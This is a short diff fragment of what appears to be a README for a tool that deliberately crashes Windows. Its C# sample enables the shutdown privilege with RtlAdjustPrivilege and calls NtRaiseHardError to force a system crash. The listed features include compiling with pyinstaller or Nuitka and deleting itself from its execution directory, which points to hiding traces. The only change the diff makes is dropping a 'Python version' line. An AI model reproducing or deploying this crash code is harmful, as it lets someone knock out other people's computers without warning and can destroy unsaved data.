@@ -11,7 +11,6 @@ C# Sample Code:
     RtlAdjustPrivilege(19, true, false, out bool previousValue);
     NtRaiseHardError(0xC0000420, 0, 0, IntPtr.Zero, 6, out uint Response);
 ```
-Python version
 
 - Supports compiling using pyinstaller and Nuitka
 - Removes itself from execution directory automatically
